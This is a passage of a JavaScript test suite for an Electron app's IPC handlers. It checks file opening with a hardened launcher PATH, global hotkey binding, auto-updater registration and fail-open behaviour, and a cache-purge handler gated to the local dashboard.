    const refused = harness({ openPathResult: "no application to open .md" });
    refused.registrar.registerShell();
    assert.deepEqual(
      await refused.handlers.get("dashboard:open-file")(wslEvent(), real),
      { ok: false, error: "no application to open .md" },
    );
    assert.match(refused.logs.join("\n"), /dashboard:open-file: OS refused .* no application to open \.md/);

    // A thrown shell.openPath is caught and reported rather than crashing the
    // handler.
    const threw = harness({ openPathThrows: true });
    threw.registrar.registerShell();
    assert.deepEqual(
      await threw.handlers.get("dashboard:open-file")(wslEvent(), real),
      { ok: false, error: "shell.openPath blew up" },
    );
  } finally {
    fs.rmSync(scratch, { recursive: true, force: true });
  }
});

// The launch must run through `openPathHardened`, not the bare primitive. On
// Linux `shell.openPath` forks `xdg-open` BY BARE NAME against the inherited
// PATH, so an agent-writable leading entry would shadow the launcher and turn
// "open this file" into arbitrary code execution. Observing the narrowed PATH
// *during* the call is what pins the wrapper into this call path: a bare
// `shell.openPath(real)` leaves PATH untouched and fails this test.
test("dashboard:open-file hardens the launcher PATH across the native launch", async () => {
  const { LINUX_LAUNCHER_PATH } = require("../open-path");
  const scratch = fs.mkdtempSync(path.join(os.tmpdir(), "openfile-"));
  try {
    const real = path.join(scratch, "doc.md");
    fs.writeFileSync(real, "# doc\n");
    const before = process.env.PATH;
    let observed;
    const h = harness({ onOpenPath: () => { observed = process.env.PATH; } });
    h.registrar.registerShell();
    assert.deepEqual(
      await h.handlers.get("dashboard:open-file")(wslEvent(), real),
      { ok: true },
    );
    if (process.platform === "linux") {
      assert.equal(
        observed,
        LINUX_LAUNCHER_PATH,
        "PATH must be narrowed to the system launcher dirs during the launch",
      );
    } else {
      // macOS/Windows resolve the handler without PATH, so the wrapper is a
      // documented pass-through there and must not touch the environment.
      assert.equal(observed, before, "non-Linux platforms are a pass-through");
    }
    // Restored afterwards, so the narrowing cannot leak into later spawns.
    assert.equal(process.env.PATH, before);
  } finally {
    fs.rmSync(scratch, { recursive: true, force: true });
  }
});

test("bind and unregister remain owned by the dedicated hotkey helper", () => {
  const h = harness({ storeValues: { globalHotkey: "Ctrl+Alt+Test" } });
  const bound = h.registrar.bindGlobalHotkey();
  assert.deepEqual(bound, { accelerator: "Ctrl+Alt+Test", bound: true });
  assert.equal(h.hotkey.state.binds.length, 1);
  assert.equal(h.hotkey.state.binds[0].saved, "Ctrl+Alt+Test");
  assert.strictEqual(h.hotkey.state.binds[0].handler, h.registrar.summonDashboard);

  h.registrar.registerShell();
  assert.deepEqual(h.handlers.get("global-hotkey:get")({}), {
    accelerator: "Ctrl+Alt+Test",
    default: "Test+Shift+K",
  });
  h.registrar.unregisterGlobalHotkey();
  assert.equal(h.hotkey.state.unregisters, 1);
  assert.equal(h.hotkey.state.current, "");
});

test("registerUpdater owns six handlers and preserves lazy gateway hooks", async () => {
  const updater = updaterHandle({ disabled: "test-disabled" });
  let initCalls = 0;
  let deps;
  const h = harness({
    storeValues: { autoDownloadUpdates: true },
    initAutoUpdate(options) {
      initCalls += 1;
      deps = options;
      return updater;
    },
  });

  assert.strictEqual(h.registerUpdater(h.registrar), updater);
  assert.deepEqual([...h.handlers.keys()].sort(), UPDATE_HANDLES);
  assert.equal(h.listeners.size, 0);
  assert.equal(initCalls, 1);
  assert.strictEqual(deps.app, h.electron.app);
  assert.strictEqual(deps.autoUpdater, h.updaterPackage.autoUpdater);
  assert.equal(h.gatewayCalls.length, 0, "registration must not touch gateway state");

  // Idempotence must not initialize again or duplicate ipcMain.handle calls.
  assert.strictEqual(h.registrar.registerUpdater(), updater);
  assert.equal(initCalls, 1);
  assert.deepEqual([...h.handlers.keys()].sort(), UPDATE_HANDLES);

  assert.equal(await deps.stopGateway(), "stopped");
  deps.onInstallDispatched();
  deps.onInstallFailed();
  assert.deepEqual(h.gatewayCalls.map(([name]) => name), [
    "stopGracefully",
    "onInstallDispatched",
    "onInstallFailed",
  ]);

  deps.onUpdateState({ phase: "available" });
  assert.deepEqual(h.sentUpdates, [["update-state", { phase: "available" }]]);

  deps.notifyUpdateFound("3.0.0", { autoDownload: true });
  assert.equal(h.notifications.length, 1);
  assert.equal(h.notifications[0].shown, 1);
  h.notifications[0].events.get("click")();
  assert.deepEqual(lastCall(h.windowCalls, "showMainWindow").slice(1), [{ focus: true }]);

  assert.deepEqual(h.handlers.get("update:get-info")(), {
    version: "2.0.0",
    packaged: true,
    disabled: "test-disabled",
  });
  assert.deepEqual(h.handlers.get("update:check")(), { ok: true });
  assert.deepEqual(h.handlers.get("update:download")(), { ok: true });
  assert.deepEqual(await h.handlers.get("update:install")(), { ok: true });
  assert.deepEqual(updater.calls, ["check", "download", "install"]);

  assert.deepEqual(h.handlers.get("update:set-channel")({}, "nightly"), {
    ok: false,
    error: "invalid channel: nightly",
  });
  assert.equal(h.store.data.updateChannel, undefined);
  assert.equal(h.handlers.get("update:set-channel")({}, "insider").ok, true);
  assert.equal(h.store.data.updateChannel, "insider");
  assert.deepEqual(h.handlers.get("update:set-auto-download")({}, "yes"), {
    ok: false,
    error: "invalid value: string",
  });
  assert.equal(h.handlers.get("update:set-auto-download")({}, false).ok, true);
  assert.equal(h.store.data.autoDownloadUpdates, false);
});

test("updater initialization is fail-open and still installs all IPC", async () => {
  const h = harness({
    initAutoUpdate() {
      throw new Error("malformed test feed");
    },
  });

  const disabled = h.registerUpdater(h.registrar);
  assert.equal(disabled.disabled, "init-failed");
  assert.deepEqual([...h.handlers.keys()].sort(), UPDATE_HANDLES);
  assert.match(h.logs.join("\n"), /continuing WITHOUT auto-update/);
  assert.match(h.logs.join("\n"), /malformed test feed/);
  assert.deepEqual(h.handlers.get("update:get-info")(), {
    version: "9.8.7",
    packaged: true,
    disabled: "init-failed",
  });
  assert.deepEqual(h.handlers.get("update:check")(), { ok: true });
  assert.deepEqual(h.handlers.get("update:download")(), { ok: true });
  assert.deepEqual(await h.handlers.get("update:install")(), { ok: true });
  assert.equal(h.gatewayCalls.length, 0, "fail-open registration must not boot or stop gateway");
});

test("pane:clear-http-cache purges only a loopback pane origin's HTTP cache", async () => {
  const h = harness();
  h.registrar.registerShell();
  const handler = h.handlers.get("pane:clear-http-cache");
  const purges = [];
  // A sender the three-gate local-dashboard check accepts: served by this
  // shell's own gateway URL, in a window whose gateway is local, primary port
  // held by kirocrew (the harness defaults).
  const event = {
    sender: { session: { clearData: async (opts) => { purges.push(opts); } } },
    senderFrame: { url: "http://localhost:5476/instances" },
  };

  assert.equal(await handler(event, "http://localhost:7778"), true);
  assert.deepEqual(purges, [{ origins: ["http://localhost:7778"], dataTypes: ["cache"] }]);
  assert.ok(h.logs.some((l) => l.includes("clear-http-cache origin=http://localhost:7778 cleared")));

  // The shell's own origin, a non-loopback host, a URL with a path, and junk
  // are all refused without touching the session.
  for (const bad of ["http://localhost:5476", "https://example.com", "http://localhost:7778/x", "", 42]) {
    assert.equal(await handler(event, bad), false, `refused ${String(bad)}`);
  }
  assert.equal(purges.length, 1);

  // A session that cannot purge, or one whose purge throws, answers false
  // rather than rejecting into the renderer.
  const local = { senderFrame: { url: "http://localhost:5476/instances" } };
  assert.equal(await handler({ ...local, sender: {} }, "http://localhost:7778"), false);
  const throwing = { ...local, sender: { session: { clearData: async () => { throw new Error("boom"); } } } };
  assert.equal(await handler(throwing, "http://localhost:7778"), false);
  assert.ok(h.logs.some((l) => l.includes("clear-http-cache origin=http://localhost:7778 failed: boom")));
});

test("pane:clear-http-cache is gated to the local dashboard sender", async () => {
  // The same preload serves a connection window pointed at a REMOTE gateway;
  // it must not be able to evict a loopback origin's cache on this machine.
  const h = harness();
  h.registrar.registerShell();
  const handler = h.handlers.get("pane:clear-http-cache");
  const purges = [];
  const session = { clearData: async (opts) => { purges.push(opts); } };
  for (const url of ["http://localhost:7778/", "https://crew.example.com/instances", "about:blank"]) {
    await assert.rejects(
      handler({ sender: { session }, senderFrame: { url } }, "http://localhost:7779"),
      /pane:clear-http-cache is restricted to the local dashboard/,
      `rejected sender ${url}`,
    );
  }
  assert.equal(purges.length, 0);
  assert.ok(h.logs.some((l) => l.includes("pane:clear-http-cache rejected for sender origin")));

  // Gate 3: a primary port held by something other than this shell's gateway
  // refuses even a correctly-originated sender.
  const foreign = harness({ primaryPortOwner: "unknown" });
  foreign.registrar.registerShell();
  await assert.rejects(
    foreign.handlers.get("pane:clear-http-cache")(
      { sender: { session }, senderFrame: { url: "http://localhost:5476/instances" } },
      "http://localhost:7779",
    ),
    /restricted to the local dashboard/,
  );
  assert.equal(purges.length, 0);
});
